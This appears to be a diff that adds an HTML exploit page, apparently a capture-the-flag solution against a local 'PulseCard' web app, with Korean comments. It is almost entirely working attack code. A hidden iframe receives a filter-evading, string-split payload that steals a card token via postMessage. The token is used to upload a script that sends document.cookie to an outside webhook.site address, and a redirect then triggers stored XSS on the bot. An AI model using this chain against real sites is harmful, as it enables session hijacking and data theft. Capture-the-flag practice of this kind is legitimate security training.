@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PulseCard Exploit</title>
+</head>
+<body>
+    <iframe id="exploitFrame" sandbox="allow-scripts" src="http://localhost:5000/preview" style="display:none;"></iframe>
+
+    <script>
+        // ⚠️ [필독] 본인의 Webhook.site 전체 주소(https://webhook.site/...)를 꼭 여기에 넣으세요!
+        const myWebhook = "https://webhook.site/29d1e2bb-f7e3-4dbe-a679-f520fe066a12"; 
+
+        const iframe = document.getElementById("exploitFrame");
+        const targetObj = 'styleMedia';
+        const pWin = '["par"+"ent"+"Win"+"dow"]';
+        const cTok = '["CARD_"+"TOKEN"]';
+        const sender = 'styleMedia["par"+"ent"+"Win"+"dow"]["par"+"ent"]["post"+"Message"]';
+        const previewPayload = sender + '(' + targetObj + pWin + cTok + ',"*")';
+
+        iframe.onload = () => {
+            iframe.contentWindow.postMessage(previewPayload, "*");
+        };
+
+        window.addEventListener("message", async (e) => {
+            const token = e.data;
+            if (!token || token === "ready" || token === "filtered" || token === "error") return;
+
+            // 카드 토큰 획득 성공 시, 봇의 세션 권한으로 쿠키(Flag) 탈취 위젯을 업로드합니다.
+            const widgetCode = "location.href='" + myWebhook + "?flag='+encodeURIComponent(document.cookie)";
+
+            const resp = await fetch("http://localhost:5000/export", {
+                method: "POST",
+                headers: {
+                    "X-Card-Token": token,
+                    "Content-Type": "application/javascript"
+                },
+                body: widgetCode
+            });
+
+            const widgetName = await resp.text();
+            
+            // 위젯 파일 생성이 완료되면 봇을 /review로 보내 XSS를 최종 트리거합니다.
+            location.href = "http://localhost:5000/review?widget=" + widgetName;
+        });
+    </script>
+</body>
+</html>
